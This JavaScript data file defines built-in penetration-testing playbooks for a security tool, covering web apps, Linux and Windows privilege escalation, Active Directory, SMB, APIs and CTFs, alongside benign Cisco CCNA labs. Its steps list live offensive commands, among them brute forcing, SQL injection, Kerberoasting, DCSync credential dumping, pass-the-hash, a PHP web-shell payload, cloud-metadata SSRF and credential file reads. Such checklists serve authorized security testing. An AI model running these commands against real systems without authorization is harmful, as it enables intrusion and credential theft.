/**
 * static/js/cyberapps/playbookstudio/data.js
 * Built-in playbooks data — ported from PlaybookStudio's shared/builtinPlaybooks.ts
 * Categories: web-app, network, active-directory, linux, windows, ctf, custom, ccna
 */

const NOW = '2025-01-01T00:00:00.000Z';

function step(id, order, title, description, category, commands, notes, required = true, mitreTechniqueId, mitreTechniqueName, stepType = 'action') {
  return {
    id, order, title, description, category, commands, notes, required,
    ...(mitreTechniqueId && { mitreTechniqueId }),
    ...(mitreTechniqueName && { mitreTechniqueName }),
    stepType,
  };
}

function ccnaStep(id, order, title, description, commands, notes, stepType = 'command') {
  return { id, order, title, description, category: 'enum', commands, notes, required: true, stepType };
}

function ccnaPb(id, name, description, tags, steps) {
  return {
    id, name, description, category: 'ccna',
    tags: ['ccna', 'cisco', ...tags], version: '1.0',
    createdAt: NOW, updatedAt: NOW, isBuiltIn: true, steps,
  };
}

// ── Web Application Assessment ────────────────────────────────────────────────
const PB_WEB_APP = {
  id: 'builtin-web-app',
  name: 'Web Application Assessment',
  description: 'Comprehensive methodology for assessing web application security.',
  category: 'web-app', tags: ['web', 'owasp', 'burp'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { TARGET_URL: '', TARGET_IP: '' },
  steps: [
    step('wa-1', 1, 'Passive Recon', 'Gather information without directly interacting with the target.', 'recon',
      ['whois target.com', 'subfinder -d target.com', 'amass enum -passive -d target.com'],
      'Check for exposed S3 buckets, leaked credentials in GitHub.', true, 'T1596', 'Search Open Technical Databases', 'action'),
    step('wa-2', 2, 'Active Recon (nmap)', 'Port scan the target to identify running services.', 'recon',
      ['nmap -sV -sC -oN nmap_initial.txt <IP>', 'nmap -p- --min-rate 5000 -oN nmap_allports.txt <IP>'],
      'Note all web services and their versions.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('wa-3', 3, 'Directory Enumeration', 'Brute-force directories and files to discover hidden content.', 'enum',
      ['ffuf -w /usr/share/wordlists/dirb/common.txt -u https://{{TARGET_URL}}/FUZZ', 'gobuster dir -u https://{{TARGET_URL}} -w raft-medium-directories.txt'],
      'Also enumerate with extensions: .php .asp .aspx .bak .old .zip', true, 'T1083', 'File and Directory Discovery', 'command'),
    step('wa-4', 4, 'Technology Fingerprinting', 'Identify the tech stack, frameworks, CMS, and libraries in use.', 'recon',
      ['whatweb https://{{TARGET_URL}}', 'curl -I https://{{TARGET_URL}}'],
      'Check headers (X-Powered-By, Server), cookies, HTML comments.', true, undefined, undefined, 'verification'),
    step('wa-5', 5, 'Authentication Testing', 'Test login mechanisms for common weaknesses.', 'exploit',
      ['hydra -L users.txt -P pass.txt https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"'],
      'Test: default credentials, no lockout, username enumeration.', true, 'T1110', 'Brute Force', 'action'),
    step('wa-6', 6, 'Input Validation Testing', 'Inject payloads into all input fields to test for injection vulnerabilities.', 'exploit',
      ["sqlmap -u 'https://{{TARGET_URL}}/page?id=1' --batch", 'dalfox url https://{{TARGET_URL}}/search?q=test'],
      'Test every user-controlled input: GET/POST params, headers, cookies.', true, 'T1059', 'Command and Scripting Interpreter', 'action'),
    step('wa-7', 7, 'Business Logic Testing', 'Test application-specific workflows for logic flaws.', 'exploit',
      [], 'Examples: price manipulation, step skipping, IDOR.', false, undefined, undefined, 'documentation'),
    step('wa-8', 8, 'File Upload Testing', 'Test file upload functionality for bypass of type restrictions.', 'exploit',
      ["exiftool -Comment=\"<?php system($_GET['cmd']); ?>\" image.jpg"],
      'Try: changing Content-Type, double extensions, null bytes.', true, 'T1505.003', 'Web Shell', 'action'),
    step('wa-9', 9, 'API Endpoint Discovery', 'Identify and test API endpoints.', 'enum',
      ['ffuf -w api-endpoints.txt -u https://{{TARGET_URL}}/api/FUZZ', 'arjun -u https://{{TARGET_URL}}/api/endpoint'],
      'Check Swagger/OpenAPI docs, JS files for hardcoded endpoints.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('wa-10', 10, 'Report Generation', 'Document all findings with evidence and recommendations.', 'report',
      [], 'Include: executive summary, findings table, per-finding detail.', true, undefined, undefined, 'documentation'),
  ],
};

// ── Linux Privilege Escalation ────────────────────────────────────────────────
const PB_LINUX_PRIVESC = {
  id: 'builtin-linux-privesc',
  name: 'Linux Privilege Escalation',
  description: 'Systematic methodology for escalating privileges on a compromised Linux host.',
  category: 'linux', tags: ['linux', 'privesc', 'post-exploitation'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true, steps: [
    step('lp-1', 1, 'Initial Enumeration', 'Establish who you are and basic host information.', 'enum',
      ['whoami', 'id', 'hostname', 'uname -a', 'cat /etc/os-release'],
      'Note your username, groups, and OS version.', true, 'T1033', 'System Owner/User Discovery', 'action'),
    step('lp-2', 2, 'SUID/GUID Binaries', 'Find binaries with SUID/GUID bit set.', 'privesc',
      ['find / -perm -u=s -type f 2>/dev/null', 'find / -perm -g=s -type f 2>/dev/null'],
      'Cross-reference with GTFOBins for exploitation methods.', true, 'T1548.001', 'Setuid and Setgid', 'command'),
    step('lp-3', 3, 'Sudo Permissions', 'Check what commands the user can run via sudo.', 'privesc',
      ['sudo -l', 'sudo -V'],
      'Any binary listed without a password can likely be abused.', true, 'T1548.003', 'Sudo and Sudo Caching', 'command'),
    step('lp-4', 4, 'Cron Jobs', 'Look for cron jobs running as root.', 'privesc',
      ['cat /etc/crontab', 'ls -la /etc/cron*', 'pspy64'],
      'If a cron script is world-writable, inject a reverse shell.', true, 'T1053.003', 'Cron', 'command'),
    step('lp-5', 5, 'Writable Files in PATH', 'Find writable directories in PATH.', 'privesc',
      ['echo $PATH', 'find /usr/local/bin /usr/bin /bin -writable 2>/dev/null'],
      'If a root cron calls a relative path command, create a malicious version.', true, 'T1574.007', 'Path Interception', 'action'),
    step('lp-6', 6, 'Kernel Version Check', 'Check kernel version against known exploits.', 'privesc',
      ['uname -r', 'searchsploit linux kernel $(uname -r)'],
      'Notable: DirtyCow (2.6.22-3.9), DirtyPipe (5.8-5.16).', true, 'T1068', 'Exploitation for Privilege Escalation', 'verification'),
    step('lp-7', 7, 'Running Services', 'Enumerate running services bound to localhost.', 'enum',
      ['ps aux', 'ss -tlnp', 'netstat -tlnp 2>/dev/null'],
      'Services bound to 127.0.0.1 may be exploitable via port forwarding.', true, 'T1057', 'Process Discovery', 'command'),
    step('lp-8', 8, 'Sensitive Files Check', 'Search for credentials and keys.', 'loot',
      ['find / -name "*.conf" -readable 2>/dev/null | head -20', 'find / -name "id_rsa" 2>/dev/null', 'cat ~/.bash_history'],
      'Check: /var/www/, /opt/, database configs, .git directories.', true, 'T1552', 'Unsecured Credentials', 'action'),
  ],
};

// ── Active Directory Initial Access ──────────────────────────────────────────
const PB_AD_INITIAL = {
  id: 'builtin-ad-initial',
  name: 'Active Directory Initial Access',
  description: 'Gaining initial foothold and escalating within an Active Directory environment.',
  category: 'active-directory', tags: ['active-directory', 'windows', 'kerberos'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { DC_IP: '', DOMAIN: '', USER: '', PASS: '' },
  steps: [
    step('ad-1', 1, 'Network Enumeration', 'Identify domain controllers and key hosts.', 'recon',
      ['nmap -sV --script=smb-security-mode -p 445 <subnet>', 'nmap -p 88 <subnet> --open'],
      'Port 88 (Kerberos) identifies DCs. Port 445 identifies domain-joined hosts.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('ad-2', 2, 'SMB Null Sessions', 'Attempt unauthenticated SMB enumeration.', 'enum',
      ['enum4linux-ng -A {{DC_IP}}', 'crackmapexec smb {{DC_IP}} --shares -u "" -p ""'],
      'Null sessions can reveal usernames, groups, shares, and password policy.', true, 'T1135', 'Network Share Discovery', 'command'),
    step('ad-3', 3, 'Kerberoasting Check', 'Request TGS tickets for SPNs and crack offline.', 'exploit',
      ['impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN}}/{{USER}}:{{PASS}}', 'hashcat -m 13100 hashes.txt rockyou.txt'],
      'Any service account with an SPN is vulnerable.', true, 'T1558.003', 'Kerberoasting', 'action'),
    step('ad-4', 4, 'Password Spray', 'Spray one password across many accounts.', 'exploit',
      ['crackmapexec smb {{DC_IP}} -u users.txt -p "Password1" --continue-on-success'],
      'Check password policy first. Stay 2 attempts below lockout threshold.', true, 'T1110.003', 'Password Spraying', 'action'),
    step('ad-5', 5, 'AS-REP Roasting', 'Find accounts with pre-authentication disabled.', 'exploit',
      ['impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{DC_IP}} -format hashcat'],
      'No credentials needed. DONT_REQUIRE_PREAUTH flag must be set.', true, 'T1558.004', 'AS-REP Roasting', 'action'),
    step('ad-6', 6, 'BloodHound Collection', 'Map AD attack paths using BloodHound.', 'enum',
      ['bloodhound-python -u {{USER}} -p {{PASS}} -d {{DOMAIN}} -dc {{DC_IP}} -c All'],
      'Look for shortest path to Domain Admin. Check ACL abuse paths.', true, 'T1087.002', 'Domain Account', 'command'),
    step('ad-7', 7, 'DCSync Check', 'Replicate domain credentials via DCSync if privileged.', 'post',
      ['impacket-secretsdump {{DOMAIN}}/{{USER}}:{{PASS}}@{{DC_IP}}'],
      'Requires DS-Replication permissions. Grants krbtgt hash.', false, 'T1003.006', 'DCSync', 'action'),
    step('ad-8', 8, 'Report', 'Document the attack path from initial access to domain compromise.', 'report',
      [], 'Include: initial access vector, privilege escalation chain, lateral movement steps.', true, undefined, undefined, 'documentation'),
  ],
};

// ── Network Recon ─────────────────────────────────────────────────────────────
const PB_NETWORK_RECON = {
  id: 'builtin-network-recon',
  name: 'Network Recon',
  description: 'Systematic network reconnaissance and service enumeration methodology.',
  category: 'network', tags: ['network', 'nmap', 'recon'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { SUBNET: '', TARGET: '' },
  steps: [
    step('nr-1', 1, 'Host Discovery', 'Identify live hosts on the network.', 'recon',
      ['nmap -sn {{SUBNET}}', 'fping -a -g {{SUBNET}} 2>/dev/null', 'arp-scan --localnet'],
      'Use multiple methods — some hosts block ICMP but respond to ARP.', true, 'T1018', 'Remote System Discovery', 'command'),
    step('nr-2', 2, 'Port Scan (Top 1000)', 'Fast scan of most common ports.', 'enum',
      ['nmap -sV -sC --top-ports 1000 -oA nmap_top1000 {{TARGET}}'],
      'Get a quick picture of the attack surface.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('nr-3', 3, 'Full Port Scan', 'Scan all 65535 ports.', 'enum',
      ['nmap -p- --min-rate 5000 -oA nmap_allports {{TARGET}}', 'masscan -p 1-65535 {{TARGET}} --rate=10000'],
      'Services often run on non-standard ports. Run in background.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('nr-4', 4, 'Service Version Detection', 'Identify exact service versions for CVE research.', 'enum',
      ['nmap -sV -sC -p <open-ports> -oA nmap_versions {{TARGET}}'],
      'Cross-reference versions with searchsploit and NVD.', true, undefined, undefined, 'verification'),
    step('nr-5', 5, 'Vulnerability Scan', 'Run automated vulnerability detection.', 'exploit',
      ['nmap --script=vuln -p <ports> {{TARGET}}', 'nmap --script=smb-vuln* -p 445 {{TARGET}}'],
      'Check for EternalBlue (MS17-010), BlueKeep. Verify findings manually.', true, 'T1190', 'Exploit Public-Facing Application', 'action'),
    step('nr-6', 6, 'Report', 'Compile network map with services and findings.', 'report',
      [], 'Include: network topology diagram, host inventory table, critical findings.', true, undefined, undefined, 'documentation'),
  ],
};

// ── OWASP Top 10 ──────────────────────────────────────────────────────────────
const PB_OWASP = {
  id: 'builtin-owasp-top10',
  name: 'OWASP Top 10 Assessment',
  description: 'Structured assessment covering all 10 OWASP Top 10 vulnerability classes.',
  category: 'web-app', tags: ['owasp', 'web', 'checklist'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { TARGET_URL: '' },
  steps: [
    step('ow-1', 1, 'A01: Broken Access Control', 'Test for IDOR, privilege escalation, CORS misconfiguration.', 'exploit',
      ['ffuf -w ids.txt -u https://{{TARGET_URL}}/api/users/FUZZ -H "Authorization: Bearer low-priv-token"'],
      'Try accessing admin endpoints with low-priv token. Increment IDs (IDOR).', true, 'T1548', 'Abuse Elevation Control Mechanism', 'action'),
    step('ow-2', 2, 'A02: Cryptographic Failures', 'Identify sensitive data exposed due to weak encryption.', 'recon',
      ['curl -I https://{{TARGET_URL}} | grep -i "strict-transport"', 'sslscan {{TARGET_URL}}'],
      'Check: TLS version, cipher suites, certificate validity, HSTS.', true, undefined, undefined, 'verification'),
    step('ow-3', 3, 'A03: Injection', 'Test all input vectors for injection vulnerabilities.', 'exploit',
      ["sqlmap -u 'https://{{TARGET_URL}}/search?q=test' --batch --dbs"],
      'Cover: SQLi, XSS, SSTI, XXE, LDAP injection, OS command injection.', true, 'T1059', 'Command and Scripting Interpreter', 'action'),
    step('ow-4', 4, 'A04: Insecure Design', 'Review design for missing security controls.', 'exploit',
      [], 'Look for: missing rate limiting, lack of anti-automation, flawed workflows.', false, undefined, undefined, 'documentation'),
    step('ow-5', 5, 'A05: Security Misconfiguration', 'Check for default configs, unnecessary features.', 'enum',
      ['curl -s https://{{TARGET_URL}}/robots.txt', 'curl -s https://{{TARGET_URL}}/.git/config'],
      'Check: debug mode, default credentials, exposed admin panels.', true, undefined, undefined, 'command'),
    step('ow-6', 6, 'A06: Vulnerable Components', 'Identify outdated or vulnerable libraries.', 'recon',
      ['retire --js --path ./static', 'npm audit'],
      'Cross-reference with NVD/CVE databases.', true, 'T1195.002', 'Compromise Software Supply Chain', 'verification'),
    step('ow-7', 7, 'A07: Auth & Session Failures', 'Test authentication and session management.', 'exploit',
      ['hydra -L users.txt -P pass.txt http-post-form "{{TARGET_URL}}/login:user=^USER^&pass=^PASS^:error"'],
      'Check: weak passwords, no MFA, session fixation, JWT weaknesses.', true, 'T1110', 'Brute Force', 'action'),
    step('ow-8', 8, 'A08: Software Integrity Failures', 'Test for insecure deserialization.', 'exploit',
      ['ysoserial -g CommonsCollections1 -a "whoami" > payload.ser'],
      'Test Java/PHP/Python deserialization. Test JWT alg:none.', false, 'T1195', 'Supply Chain Compromise', 'action'),
    step('ow-9', 9, 'A09: Logging & Monitoring Failures', 'Verify security events are logged.', 'verification',
      [], 'Perform suspicious actions and check if they appear in logs.', false, undefined, undefined, 'verification'),
    step('ow-10', 10, 'A10: SSRF', 'Test for Server-Side Request Forgery.', 'exploit',
      ['curl -s "https://{{TARGET_URL}}/fetch?url=http://169.254.169.254/latest/meta-data/"'],
      'Try: AWS metadata endpoint, internal IPs, file:// scheme.', true, 'T1090', 'Proxy', 'action'),
  ],
};

// ── SMB Enumeration ───────────────────────────────────────────────────────────
const PB_SMB_ENUM = {
  id: 'builtin-smb-enum',
  name: 'SMB Enumeration',
  description: 'Comprehensive SMB/CIFS enumeration methodology.',
  category: 'network', tags: ['smb', 'windows', 'network', 'enum'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { TARGET_IP: '', DOMAIN: '', USER: '', PASS: '' },
  steps: [
    step('smb-1', 1, 'SMB Port Check', 'Confirm SMB ports are open and identify protocol version.', 'recon',
      ['nmap -p 139,445 --open {{TARGET_IP}}', 'nmap -sV -p 139,445 --script=smb-security-mode {{TARGET_IP}}'],
      'Port 139=NetBIOS/SMBv1, 445=SMBv2+.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('smb-2', 2, 'Vulnerability Scan', 'Check for critical SMB vulnerabilities.', 'exploit',
      ['nmap --script=smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 {{TARGET_IP}}'],
      'MS17-010=EternalBlue. Any hit = critical finding.', true, 'T1210', 'Exploitation of Remote Services', 'command'),
    step('smb-3', 3, 'Null Session Enumeration', 'Attempt unauthenticated enumeration.', 'enum',
      ['enum4linux -a {{TARGET_IP}}', 'smbclient -L //{{TARGET_IP}}/ -N'],
      'Null sessions reveal: domain name, users, groups, password policy.', true, 'T1135', 'Network Share Discovery', 'command'),
    step('smb-4', 4, 'Authenticated Share Enumeration', 'List shares using discovered credentials.', 'enum',
      ['smbmap -H {{TARGET_IP}} -u {{USER}} -p {{PASS}}', 'crackmapexec smb {{TARGET_IP}} --shares -u {{USER}} -p {{PASS}}'],
      'Look for non-default shares. Check read/write access.', true, 'T1135', 'Network Share Discovery', 'command'),
    step('smb-5', 5, 'SYSVOL Script Analysis', 'Check SYSVOL for Group Policy Preferences passwords.', 'loot',
      ["find . -name 'Groups.xml' | xargs grep -l 'cpassword'"],
      'GPP passwords in Groups.xml are encrypted with a known key.', true, 'T1552.006', 'Group Policy Preferences', 'command'),
    step('smb-6', 6, 'Pass-the-Hash Attempt', 'If NTLM hashes obtained, attempt PTH authentication.', 'exploit',
      ['crackmapexec smb {{TARGET_IP}} -u {{USER}} -H <NTLM_HASH>'],
      'SMB signing must be disabled for relay.', false, 'T1550.002', 'Pass the Hash', 'action'),
  ],
};

// ── Privilege Escalation Checklist ────────────────────────────────────────────
const PB_PRIVESC = {
  id: 'builtin-privesc-checklist',
  name: 'Privilege Escalation Checklist',
  description: 'Comprehensive checklist covering Windows and Linux privilege escalation vectors.',
  category: 'windows', tags: ['privesc', 'windows', 'linux', 'checklist'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true, steps: [
    step('pc-1', 1, 'Windows: System Information', 'Gather system info to identify OS version.', 'enum',
      ['systeminfo', 'whoami /all', 'net user', 'net localgroup administrators'],
      'Check: OS version for unpatched vulns, user privileges.', true, 'T1082', 'System Information Discovery', 'command'),
    step('pc-2', 2, 'Windows: Unquoted Service Paths', 'Find services with unquoted paths.', 'privesc',
      ["wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\""],
      'Plant malicious binary in exploitable directory.', true, 'T1574.009', 'Unquoted Service Path', 'command'),
    step('pc-3', 3, 'Windows: Token Impersonation', 'Check for SeImpersonatePrivilege.', 'privesc',
      ['whoami /priv'],
      'If SeImpersonatePrivilege is enabled: use PrintSpoofer or RoguePotato.', true, 'T1134.001', 'Token Impersonation', 'verification'),
    step('pc-4', 4, 'Linux: World-Writable Files', 'Find world-writable files and directories.', 'privesc',
      ['find / -xdev -type f -perm -0002 2>/dev/null', 'find / -xdev -type d -perm -0002 2>/dev/null'],
      'Check if writable files are executed by higher-privileged processes.', true, 'T1548.001', 'Setuid and Setgid', 'command'),
    step('pc-5', 5, 'Linux: Capabilities', 'Check for processes with elevated Linux capabilities.', 'privesc',
      ['getcap -r / 2>/dev/null'],
      'Notable caps: cap_setuid+ep, cap_net_raw+ep. Cross-reference with GTFOBins.', true, 'T1548', 'Abuse Elevation Control Mechanism', 'command'),
    step('pc-6', 6, 'Linux: NFS Shares', 'Check for NFS shares with no_root_squash.', 'privesc',
      ['cat /etc/exports', 'showmount -e <target>'],
      'If no_root_squash is set, mount share as root and create SUID binary.', false, 'T1039', 'Data from Network Shared Drive', 'verification'),
  ],
};

// ── API Security Assessment ───────────────────────────────────────────────────
const PB_API_SECURITY = {
  id: 'builtin-api-security',
  name: 'API Security Assessment',
  description: 'OWASP API Security Top 10 focused assessment methodology.',
  category: 'web-app', tags: ['api', 'rest', 'graphql', 'owasp'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { API_BASE: '', TOKEN: '' },
  steps: [
    step('api-1', 1, 'API Discovery', 'Enumerate all API endpoints, versions, and documentation.', 'recon',
      ['ffuf -w api-endpoints.txt -u {{API_BASE}}/FUZZ', 'curl -s {{API_BASE}}/swagger.json'],
      'Look for: Swagger/OpenAPI docs, versioning, GraphQL introspection.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('api-2', 2, 'Authentication Testing', 'Test JWT, API keys, OAuth tokens.', 'exploit',
      ['curl -s {{API_BASE}}/users -H "Authorization: Bearer INVALID"', 'python3 jwt_tool.py <token> -T'],
      'Test: alg:none JWT, weak secret, API key in URL, token expiry.', true, 'T1528', 'Steal Application Access Token', 'action'),
    step('api-3', 3, 'BOLA Testing (IDOR)', 'Test for Broken Object Level Authorization.', 'exploit',
      ['curl -s {{API_BASE}}/users/1 -H "Authorization: Bearer {{TOKEN}}"', 'curl -s {{API_BASE}}/users/2 -H "Authorization: Bearer {{TOKEN}}"'],
      'Increment IDs, try UUIDs of other users with low-priv token.', true, 'T1548', 'Abuse Elevation Control Mechanism', 'action'),
    step('api-4', 4, 'Rate Limiting', 'Test for missing rate limiting on sensitive endpoints.', 'exploit',
      ['ab -n 1000 -c 50 -H "Authorization: Bearer {{TOKEN}}" {{API_BASE}}/login'],
      'Test: brute force endpoints, OTP bypass via rate limit absence.', true, undefined, undefined, 'action'),
    step('api-5', 5, 'Mass Assignment', 'Test for unprotected parameter binding.', 'exploit',
      ["curl -s -X PUT {{API_BASE}}/users/me -H \"Authorization: Bearer {{TOKEN}}\" -d '{\"role\":\"admin\"}'"],
      'Add extra fields to requests: role, isAdmin, permissions, balance.', true, undefined, undefined, 'action'),
    step('api-6', 6, 'Report', 'Document all API vulnerabilities with CVSS scores.', 'report',
      [], 'Include API inventory, auth flow diagram, findings with PoC curl commands.', true, undefined, undefined, 'documentation'),
  ],
};

// ── CCNA: OSPF Single Area ────────────────────────────────────────────────────
const PB_CCNA_OSPF = ccnaPb('ccna-ospf-single', 'OSPF Single Area (3 Routers)',
  'Configure OSPF in a single area across three routers and verify neighbor adjacencies.',
  ['ospf', 'routing'],
  [
    ccnaStep('ospf1-1', 1, 'Configure Router Interfaces', 'Assign IP addresses to the router interfaces.',
      ['interface GigabitEthernet0/0', 'ip address 10.0.12.1 255.255.255.0', 'no shutdown', 'exit'],
      'Repeat for each router interface. Use /30 or /24 subnets between routers.'),
    ccnaStep('ospf1-2', 2, 'Enable OSPF Process', 'Start the OSPF routing process and set the router ID.',
      ['router ospf 1', 'router-id 1.1.1.1', 'exit'],
      'Each router must have a unique router-id. Use a loopback for stability.'),
    ccnaStep('ospf1-3', 3, 'Advertise Networks', 'Add network statements to include all connected interfaces.',
      ['router ospf 1', 'network 10.0.12.0 0.0.0.255 area 0', 'network 192.168.1.0 0.0.0.255 area 0'],
      'Use wildcard masks (inverse of subnet mask). Area 0 is the backbone area.'),
    ccnaStep('ospf1-4', 4, 'Verify OSPF Neighbors', 'Check all neighbor adjacencies are in FULL state.',
      ['show ip ospf neighbor', 'show ip ospf interface brief'],
      'State should be FULL for point-to-point links.', 'verification'),
    ccnaStep('ospf1-5', 5, 'Verify Routing Table', 'Confirm OSPF routes appear in the routing table.',
      ['show ip route ospf', 'show ip route'],
      'OSPF routes appear with "O" prefix. Verify all remote networks are reachable.', 'verification'),
  ]);

// ── CCNA: VLAN Configuration ──────────────────────────────────────────────────
const PB_CCNA_VLAN = ccnaPb('ccna-vlan', 'VLAN Configuration',
  'Create VLANs on a switch, assign access ports, and configure trunking.',
  ['vlan', 'switching'],
  [
    ccnaStep('vlan-1', 1, 'Create VLANs', 'Add VLAN IDs and descriptive names.',
      ['vlan 10', 'name SALES', 'exit', 'vlan 20', 'name IT', 'exit'],
      'VLANs 1, 1002-1005 are reserved. Use 2-4094 for custom VLANs.'),
    ccnaStep('vlan-2', 2, 'Assign Access Ports', 'Configure switch ports as access ports.',
      ['interface FastEthernet0/1', 'switchport mode access', 'switchport access vlan 10', 'no shutdown'],
      'Access ports carry traffic for one VLAN only.'),
    ccnaStep('vlan-3', 3, 'Configure Trunk Port', 'Set the uplink as an 802.1Q trunk.',
      ['interface GigabitEthernet0/1', 'switchport mode trunk', 'switchport trunk allowed vlan 10,20,30'],
      'Trunk ports carry multiple VLANs tagged with 802.1Q headers.'),
    ccnaStep('vlan-4', 4, 'Verify VLAN Database', 'Confirm VLANs were created and ports assigned.',
      ['show vlan brief', 'show interfaces trunk'],
      'Active VLANs show in show vlan brief.', 'verification'),
  ]);

// ── CTF Quick Start ───────────────────────────────────────────────────────────
const PB_CTF = {
  id: 'builtin-ctf-quick',
  name: 'CTF Quick Start',
  description: 'Generic CTF challenge workflow: initial enum, web/binary/crypto triage, flag capture.',
  category: 'ctf', tags: ['ctf', 'htb', 'tryhackme'], version: '1.0',
  createdAt: NOW, updatedAt: NOW, isBuiltIn: true,
  variables: { TARGET_IP: '' },
  steps: [
    step('ctf-1', 1, 'Initial Nmap Scan', 'Quickly enumerate open ports.', 'recon',
      ['nmap -sV -sC -T4 -oN nmap.txt {{TARGET_IP}}', 'nmap -p- --min-rate 10000 -oN allports.txt {{TARGET_IP}}'],
      'Focus on web (80/443/8080), SSH (22), SMB (139/445), databases.', true, 'T1046', 'Network Service Discovery', 'command'),
    step('ctf-2', 2, 'Web Enumeration', 'Enumerate web directories and technologies.', 'enum',
      ['gobuster dir -u http://{{TARGET_IP}} -w /usr/share/seclists/Discovery/Web-Content/common.txt', 'whatweb http://{{TARGET_IP}}'],
      'Check /robots.txt, /sitemap.xml, source code comments.', true, undefined, undefined, 'command'),
    step('ctf-3', 3, 'Credential Check', 'Test for default/common credentials.', 'exploit',
      ['hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt http-get //{{TARGET_IP}}'],
      'Also try admin:admin, admin:password, guest:guest manually.', false, 'T1110', 'Brute Force', 'action'),
    step('ctf-4', 4, 'Foothold', 'Exploit identified vulnerability for initial access.', 'exploit',
      [], 'Document the exact exploit, PoC, and flags found.', true, 'T1190', 'Exploit Public-Facing Application', 'action'),
    step('ctf-5', 5, 'Privilege Escalation', 'Escalate from user to root/admin.', 'privesc',
      ['sudo -l', 'find / -perm -u=s -type f 2>/dev/null', 'linpeas.sh'],
      'Run linPEAS/winPEAS for automated enum. Check sudo, SUID, crons.', true, 'T1068', 'Exploitation for Privilege Escalation', 'action'),
    step('ctf-6', 6, 'Capture Root Flag', 'Find and submit the root flag.', 'loot',
      ['cat /root/root.txt', 'cat /root/proof.txt', 'type C:\\Users\\Administrator\\Desktop\\root.txt'],
      'Common locations: /root/, /home/user/, Desktop.', true, undefined, undefined, 'action'),
  ],
};

/** All built-in playbooks — merged and exported */
export const BUILTIN_PLAYBOOKS = [
  PB_WEB_APP,
  PB_LINUX_PRIVESC,
  PB_AD_INITIAL,
  PB_NETWORK_RECON,
  PB_OWASP,
  PB_SMB_ENUM,
  PB_PRIVESC,
  PB_API_SECURITY,
  PB_CTF,
  PB_CCNA_OSPF,
  PB_CCNA_VLAN,
];

/** VAPT methodologies for import */
export const VAPT_METHODOLOGIES = [
  {
    id: 'owasp-otg',
    name: 'OWASP Testing Guide v4',
    description: 'OWASP OTG v4 — 11 test categories covering web app security.',
    phases: [
      { name: 'OTG-INFO: Information Gathering', description: 'Gather information about the target web application using passive and active techniques.' },
      { name: 'OTG-CONFIG: Configuration and Deployment', description: 'Review network, application, and file extension configurations.' },
      { name: 'OTG-IDENT: Identity Management', description: 'Test account provisioning, account enumeration, username policies.' },
      { name: 'OTG-AUTHN: Authentication', description: 'Test authentication mechanisms including brute force protection and bypass techniques.' },
      { name: 'OTG-AUTHZ: Authorization', description: 'Test path traversal, authorization bypass, privilege escalation, and IDOR.' },
      { name: 'OTG-SESS: Session Management', description: 'Test session token randomness, cookie attributes, CSRF, session fixation.' },
      { name: 'OTG-INPVAL: Input Validation', description: 'Test for XSS, SQL injection, LDAP injection, XML injection, code injection.' },
      { name: 'OTG-ERR: Error Handling', description: 'Analyze error codes and stack traces for information leakage.' },
      { name: 'OTG-CRYPST: Cryptography', description: 'Test SSL/TLS configuration, cipher suites, and certificate validation.' },
      { name: 'OTG-BUSLOGIC: Business Logic', description: 'Test business logic data validation and process timing vulnerabilities.' },
      { name: 'OTG-CLIENT: Client Side', description: 'Test DOM-based XSS, HTML injection, CSS injection, and WebSocket security.' },
    ],
  },
  {
    id: 'ptes',
    name: 'PTES (Penetration Testing Execution Standard)',
    description: 'PTES 7-phase framework covering the full lifecycle of a penetration test.',
    phases: [
      { name: 'Pre-Engagement Interactions', description: 'Scope definition, rules of engagement, legal agreements.' },
      { name: 'Intelligence Gathering', description: 'OSINT collection: WHOIS, DNS, network ranges, employee data.' },
      { name: 'Threat Modeling', description: 'Identify business assets, threat communities, and attack vectors.' },
      { name: 'Vulnerability Analysis', description: 'Active and passive vulnerability identification.' },
      { name: 'Exploitation', description: 'Attempt exploitation of identified vulnerabilities.' },
      { name: 'Post-Exploitation', description: 'Establish persistence, enumerate sensitive data, pivot.' },
      { name: 'Reporting', description: 'Document all findings with executive summary and actionable remediation.' },
    ],
  },
  {
    id: 'nist-800-115',
    name: 'NIST SP 800-115',
    description: 'NIST 800-115 Technical Guide to Information Security Testing.',
    phases: [
      { name: 'Planning', description: 'Define objectives, scope, and constraints. Obtain authorization.' },
      { name: 'Discovery', description: 'Network scanning, host discovery, service identification.' },
      { name: 'Attack', description: 'Attempt to validate discovered vulnerabilities.' },
      { name: 'Reporting', description: 'Produce deliverables: executive summary, findings, risk ratings.' },
    ],
  },
];
